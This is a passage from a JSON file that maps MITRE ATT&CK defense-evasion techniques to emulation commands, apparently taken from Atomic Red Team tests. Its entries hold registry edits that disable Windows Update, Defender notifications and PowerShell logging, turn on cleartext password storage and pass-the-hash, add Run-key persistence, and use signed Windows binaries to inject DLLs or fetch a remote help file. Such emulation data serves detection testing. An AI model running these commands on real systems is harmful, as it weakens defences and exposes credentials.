            "command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v DisallowRun /t REG_DWORD /d 1 /f && reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /f /t REG_SZ /v art1 /d \"regedit.exe\" && reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /f /t REG_SZ /v art2 /d \"cmd.exe\""
         },
         {
            "description": "Attackers need to change the powershell execution policy in order to run their malicious powershell scripts.\nThey can either specify it during the execution of the powershell script or change the registry value for it.\n",
            "command": "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine"
         },
         {
            "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows notification center.\nSee how remcos rat abuses this technique- https://tccontre.blogspot.com/2020/01/remcos-rat-evading-windows-defender-av.html\n",
            "command": "reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f"
         },
         {
            "description": "Do Not Connect To Win Update. Redline is using this as part of its defense evasion.\n",
            "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\" /v \"DoNotConnectToWindowsUpdateInternetLocations\" /t REG_DWORD /d 1 /f"
         },
         {
            "description": "Disable Auto Update Windows OS feature. Redline is using this as part of its defense evasion.\n",
            "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"NoAutoUpdate\" /t REG_DWORD /d 1 /f"
         },
         {
            "description": "Upon execution, a javascript block will be placed in the registry for persistence.\nAdditionally, open Registry Editor to view the modified entry in HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings.\n",
            "command": "New-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" -Name T1112 -Value \"<script>\""
         },
         {
            "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows CMD application.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n",
            "command": "New-ItemProperty -Path \"HKLM:\\Software\\Policies\\Microsoft\\Windows\\System\" -Name DisableCMD -Value 1"
         },
         {
            "description": "NetWire continues to create its home key (HKCU\\SOFTWARE\\NetWire) as well as adding it into the auto-run group in the victim\u2019s registry.\nSee how NetWire malware - https://app.any.run/tasks/41ecdbde-4997-4301-a350-0270448b4c8f/\n",
            "command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v NetWire /t REG_SZ  /d \"C:\\Users\\admin\\AppData\\Roaming\\Install\\Host.exe\" /f && reg add HKCU\\SOFTWARE\\NetWire /v HostId /t REG_SZ /d HostId-kai6Ci /f && reg add HKCU\\SOFTWARE\\NetWire /v \"Install Date\" /t REG_SZ /d \"2021-08-30 07:17:27\" /f"
         },
         {
            "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows Lock workstation feature.\nSee how ransomware abuses this technique- https://www.bleepingcomputer.com/news/security/in-dev-ransomware-forces-you-do-to-survey-before-unlocking-computer/\n",
            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableLockWorkstation /t REG_DWORD /d 1 /f"
         },
         {
            "description": "Modify the registry of the currently logged in user using reg.exe via cmd console. Upon execution, the message \"The operation completed successfully.\"\nwill be displayed. Additionally, open Registry Editor to view the new entry in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced.\n",
            "command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v HideFileExt /d 1 /f"
         },
         {
            "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove File menu from Windows Explorer Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFileMenu /t REG_DWORD /d 1 /f"
         },
         {
            "description": "Modify the Local Machine registry RUN key to change Windows Defender executable that should be ran on startup.  This should only be possible when\nCMD is ran as Administrative rights. Upon execution, the message \"The operation completed successfully.\"\nwill be displayed. Additionally, open Registry Editor to view the modified entry in HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.\n",
            "command": "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_EXPAND_SZ /v SecurityHealth /d calc.exe /f"
         },
         {
            "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove Run menu from Start Menu Group Policy.\nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoRun /t REG_DWORD /d 1 /f"
         },
         {
            "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable changes to Taskbar and Start Menu Settings Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoSetTaskbar /t REG_DWORD /d 1 /f"
         },
         {
            "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the networking icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCANetwork /t REG_DWORD /d 1 /f"
         },
         {
            "description": "This test emulates Mimic ransomware's ability to enable multiple user sessions by modifying the AllowMultipleTSSessions value within the Winlogon registry key. \nSee [Mimic Ransomware Overview] (https://www.trendmicro.com/en_us/research/23/a/new-mimic-ransomware-abuses-everything-apis-for-its-encryption-p.html)\n",
            "command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon /t REG_DWORD /v AllowMultipleTSSessions /d 1 /f"
         },
         {
            "description": "The following Atomic Test creates a registry blob in HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds, which is related to Snake Malware. Per the report, upon execution, Snake's WerFault.exe will attempt to decrypt an encrypted blob within the Windows\nregistry that is typically found at HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds. The encrypted data includes the AES key, IV, and path that is used to find and decrypt the file containing Snake's kernel driver and kernel driver loader.\n",
            "command": "$typicalPath = \"HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds\"; $randomBytes = New-Object Byte[] 0x1000; (New-Object Random).NextBytes($randomBytes); New-ItemProperty -Path $typicalPath -Name \"AtomicSnake\" -Value $randomBytes -PropertyType Binary -Force | Out-Null"
         },
         {
            "description": "This test simulates an adversary modifying the Internet Zone Protocol Defaults in the registry of the currently logged-in user using the reg.exe utility via the command prompt. Such modifications can be indicative of an adversary trying to weaken browser security settings. Upon execution, if successful, the message \"The operation completed successfully.\" will be displayed.\nTo verify the effects of the test:\n1. Open the Registry Editor (regedit.exe).\n2. Navigate to \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\".\n3. Check for the presence of the \"http\" and \"https\" DWORD values set to `0`.\nOr run:\n```batch\nreg query \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\"\n```\n",
            "command": "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v http /t REG_DWORD /d 0 /F && reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v https /t REG_DWORD /d 0 /F"
         },
         {
            "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the battery icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAPower /t REG_DWORD /d 1 /f"
         },
         {
            "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the volume icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect..\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAVolume /t REG_DWORD /d 1 /f"
         },
         {
            "description": "Modify event viewer registry values to alter the behavior of the online help redirection. Upon opening an event in event viewer and attempting to view the help page for the event, it will execute the program defined in the redirection program registry entry.",
            "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /d \"C:\\windows\\system32\\notepad.exe\" /f"
         },
         {
            "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to allow rdp remote assistance feature. This feature allow specific\nuser to rdp connect on the targeted machine.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
            "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /t REG_DWORD /d 1 /f"
         },
         {
            "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to suppress the windows defender notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
            "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration\" /v Notification_Suppress /t REG_DWORD /d 1 /f"
         },
         {
            "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove Search menu from Start Menu Group Policy.\nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFind /t REG_DWORD /d 1 /f"
         },
         {
            "description": "This task recreates the steps taken by BlackByte ransomware before it worms to other machines via Powershell.  See \"Preparing to Worm\" section: https://redcanary.com/blog/blackbyte-ransomware/\nThe steps are as follows:\n<ol>\n    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>\n    <li>2. Enable OS to share network connections between different privilege levels</li>\n    <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>\n</ol>\nThe registry keys and their respective values will be created upon successful execution.\n",
            "command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force; New-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force"
         },
         {
            "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to hide all icons on Desktop Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoDesktop /t REG_DWORD /d 1 /f"
         },
         {
            "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable Powershell Module Logging, Script Block Logging, Transcription and Script Execution\nsee https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.PowerShell::EnableModuleLogging\n",
            "command": "reg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging /v EnableModuleLogging /t REG_DWORD /d 0 /f && reg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f && reg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription /v EnableTranscripting /t REG_DWORD /d 0 /f && reg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell /v EnableScripts /t REG_DWORD /d 0 /f && reg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell /v EnableScripts /f >nul 2>&1"
         },
         {
            "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to hide Properties from \"My Documents icon\" Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoPropertiesMyDocuments /t REG_DWORD /d 1 /f"
         },
         {
            "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows security center notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
            "command": "reg add HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f"
         },
         {
            "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable and remove the Shut Down command Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoClose /t REG_DWORD /d 1 /f"
         },
         {
            "description": "This test simulates an adversary modifying the Internet Zone Protocol Defaults in the registry of the currently logged-in user using PowerShell. Such modifications can be indicative of an adversary attempting to weaken browser security settings. \nTo verify the effects of the test:\n1. Open the Registry Editor (regedit.exe).\n2. Navigate to \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\".\n3. Check for the presence of the \"http\" and \"https\" DWORD values set to `0`.\nOr run:\n```powershell\nGet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' | Select-Object http,https\n```\n",
            "command": "Set-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' -Name 'http' -Value 0; Set-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' -Name 'https' -Value 0"
         },
         {
            "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Hide Clock Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideClock /t REG_DWORD /d 1 /f"
         },
         {
            "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows toast notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
            "command": "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f"
         },
         {
            "description": "Modify the registry to allow a driver, service, to persist in Safe Mode.\nsee https://redcanary.com/blog/tracking-driver-inventory-to-expose-rootkits/ and https://blog.didierstevens.com/2007/03/26/playing-with-safe-mode/ for further details.\nAdding a subkey to Minimal with the name of your service and a default value set to Service, makes that your service will be started when you boot into Safe Mode without networking. The same applies for the Network subkey.\n",
            "command": "REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\AtomicSafeMode\" /VE /T REG_SZ /F /D \"Service\""
         },
         {
            "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove security and maintenance icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAHealth /t REG_DWORD /d 1 /f"
         },
         {
            "description": "Sets registry key that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping).\nUpon execution, the message \"The operation completed successfully.\" will be displayed.\nAdditionally, open Registry Editor to view the modified entry in HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest.\n",
            "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f"
         },
         {
            "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows logoff button.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/be/threat-encyclopedia/search/js_noclose.e/2\n",
            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoLogOff /t REG_DWORD /d 1 /f && reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v StartMenuLogOff /t REG_DWORD /d 1 /f"
         },
         {
            "description": "This test emulates Mimic ransomware's ability to enable multiple RDP sessions per user by modifying the fSingleSessionPerUser value within the Terminal Server registry key. \nSee [Mimic Ransomware Overview] (https://www.trendmicro.com/en_us/research/23/a/new-mimic-ransomware-abuses-everything-apis-for-its-encryption-p.html)\n",
            "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f"
         },
         {
            "description": "Disable Windows Auto Reboot for current logon user. Redline is using this as part of its defense evasion.\n",
            "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"NoAutoRebootWithLoggedOnUsers\" /t REG_DWORD /d 1 /f"
         },
         {
            "description": "Windows Auto Update Option to Notify before download. Redline is using this as part of its defense evasion.\n",
            "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"AUOptions\" /t REG_DWORD /d 2 /f"
         },
         {
            "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows registry tool to prevent user modifying registry entry.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n",
            "command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableRegistryTools /t REG_DWORD /d 1 /f"
         },
         {
            "description": "Enabling Restricted Admin Mode via Command_Prompt,enables an attacker to perform a pass-the-hash attack using RDP.\n\nSee [Passing the Hash with Remote Desktop](https://www.kali.org/blog/passing-hash-remote-desktop/)\n",
            "command": "reg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0"
         }
      ]
   },
   "T1218.001": {
      "technique_name": "Signed Binary Proxy Execution: Compiled HTML File",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Executes a CHM file with the ITS protocol handler.",
            "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHCompiledHelp -InfoTechStorageHandler its -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm"
         },
         {
            "description": "Executes a CHM file simulating a user double click.",
            "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath Test.chm"
         },
         {
            "description": "Executes a CHM file with the default Shortcut Command method.",
            "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHCompiledHelp -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm"
         },
         {
            "description": "Uses hh.exe to execute a remote compiled HTML Help payload.\nUpon execution displays an error saying the file cannot be open\n",
            "command": "hh.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm"
         },
         {
            "description": "Executes a CHM file using the Shortcut Command method with a defined ITS Protocol Handler, and help topic extension.",
            "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler its -TopicExtension html -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm"
         },
         {
            "description": "Uses hh.exe to execute a local compiled HTML Help payload.\nUpon execution calc.exe will open\n",
            "command": "hh.exe \"9e2e6f_T1218.001.chm\""
         },
         {
            "description": "Executes a CHM file with a defined script engine, ITS Protocol Handler, and help topic extension.",
            "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHCompiledHelp -ScriptEngine JScript -InfoTechStorageHandler its -TopicExtension html -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm"
         },
         {
            "description": "Uses hh.exe to decompile a local compiled HTML Help file.\nUpon successful execution the chm file will decompile to disk.\nReference:https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/\n",
            "command": "hh.exe -decompile %temp% \"9e2e6f_T1218.001.chm\""
         }
      ]
   },
   "T1218": {
      "technique_name": "Signed Binary Proxy Execution",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Executes logon scripts configured in Group Policy.\nhttps://lolbas-project.github.io/lolbas/Binaries/Gpscript/\nhttps://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/\n",
            "command": "Gpscript /logon"
         },
         {
            "description": "Emulates attack with Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe\n",
            "command": ""
         },
         {
            "description": "Injects arbitrary DLL into running process specified by process ID. Requires Windows 10.\n",
            "command": "mavinject.exe #{process_id} /INJECTRUNNING \"#{dll_payload}\""
         },
         {
            "description": "Emulates attack via documents through protocol handler in Microsoft Office.  On successful execution you should see Microsoft Word launch a blank file.\n",
            "command": "FOR /F \"tokens=2*\" %a in ('reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Winword.exe\" /V PATH') do set microsoft_wordpath=%b && call \"%microsoft_wordpath%\\protocolhandler.exe\" \"ms-word:nft|u|https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx\""
         },
         {
            "description": "RemoteFXvGPUDisablement.exe is an abusable, signed PowerShell host executable that was introduced in Windows 10 and Server 2019 (OS Build 17763.1339).\n\nOne of the PowerShell functions called by RemoteFXvGPUDisablement.exe is Get-VMRemoteFXPhysicalVideoAdapter, a part of the Hyper-V module. This atomic test influences RemoteFXvGPUDisablement.exe to execute custom PowerShell code by using a technique referred to as \"PowerShell module load-order hijacking\" where a module containing, in this case, an implementation of the Get-VMRemoteFXPhysicalVideoAdapter is loaded first by way of introducing a temporary module into the first directory listed in the %PSModulePath% environment variable or within a user-specified module directory outside of %PSModulePath%. Upon execution the temporary module is deleted.\n\nInvoke-ATHRemoteFXvGPUDisablementCommand is used in this test to demonstrate how a PowerShell host executable can be directed to user-supplied PowerShell code without needing to supply anything at the command-line. PowerShell code execution is triggered when supplying the \"Disable\" argument to RemoteFXvGPUDisablement.exe.\n\nThe Invoke-ATHRemoteFXvGPUDisablementCommand function outputs all relevant execution-related artifacts.\n\nReference: https://github.com/redcanaryco/AtomicTestHarnesses/blob/master/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1\n",
            "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName foo -ModulePath $PWD"
         },
         {
            "description": "Emulates attack with a renamed Microsoft.Workflow.Compiler.exe running a .Net assembly that launches calc.exe\n",
            "command": "&\"#{renamed_binary}\" \"#{xml_payload}\" output.txt"
         },
         {
            "description": "Test execution of a .inf using InfDefaultInstall.exe\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml\n",
            "command": "InfDefaultInstall.exe \"67d07e_Infdefaultinstall.inf\""
         },
         {
            "description": "Executes commands from a specially prepared ie4uinit.inf file.\nPoc from : https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/\nReference: https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/\n",
            "command": "copy c:\\windows\\system32\\ie4uinit.exe %TEMP%\\ie4uinit.exe && copy \"cebed2_ieuinit.inf\" %TEMP%\\ieuinit.inf && %TEMP%\\ie4uinit.exe -BaseSettings"
         },
         {
            "description": "This test simulates an adversary copying `customshellhost.exe` and `calc.exe` from `C:\\windows\\system32\\` to `C:\\temp\\`, renaming `calc.exe` to `explorer.exe`.\nUpon execution, customshellhost.exe will spawn calc.exe.\nNote this will only work on Windows 10 or 11.\n[LOLBAS](https://lolbas-project.github.io/lolbas/Binaries/CustomShellHost/)\n[BishopFox](https://bishopfox.com/blog/edr-bypass-with-lolbins)\n",
            "command": "if (-not (Test-Path C:\\test)) {; New-Item -Path C:\\test -ItemType Directory; } else {; Write-Host \"Directory C:\\test already exists.\" }; Copy-Item -Path \"C:\\windows\\system32\\customshellhost.exe\" -Destination \"C:\\test\\customshellhost.exe\" -Force; Copy-Item -Path \"C:\\windows\\system32\\calc.exe\" -Destination \"C:\\test\\explorer.exe\" -Force; C:\\test\\customshellhost.exe"
         },
         {
            "description": "Provlaunch.exe executes a command defined in the Registry. This test will create the necessary registry keys and values, then run provlaunch.exe to execute an arbitrary command.\n- https://twitter.com/0gtweet/status/1674399582162153472\n- https://lolbas-project.github.io/lolbas/Binaries/Provlaunch/\nRegistry keys are deleted after successful execution.\n",
            "command": "reg.exe add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1 /v altitude /t REG_DWORD /d 0 && reg add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1\\dummy2 /v Commandline /d calc.exe && c:\\windows\\system32\\provlaunch.exe LOLBin"
         },
         {
            "description": "This test uses Wuauclt to load an arbitrary DLL. Upon execution with the default inputs, calculator.exe will be launched. \nSee https://dtm.uk/wuauclt/\n",
            "command": "wuauclt.exe /UpdateDeploymentProvider \"6349c0_calc.dll\" /RunHandlerComServer"
         },
         {
            "description": "Emulates attack with a DiskShadow.exe (LOLBIN installed by default on Windows) being used to execute arbitrary commands Reference: https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/\n",
            "command": ""
         },
         {
            "description": "Executes startup scripts configured in Group Policy\nhttps://lolbas-project.github.io/lolbas/Binaries/Gpscript/\nhttps://oddvar.moe/2018/04/27/gpscript-exe-another-lolbin-to-the-list/\n",
            "command": "Gpscript /startup"
         },
         {
            "description": "Execute arbitrary dll. Requires at least Windows 8/2012. Also note this dll can be served up via SMB\n",
            "command": "C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path \"#{dll_payload}\""
         }
      ]
   },
   "T1070.004": {
      "technique_name": "Indicator Removal on Host: File Deletion",
      "tactic": "defense-evasion",
      "known implementations": [
         {
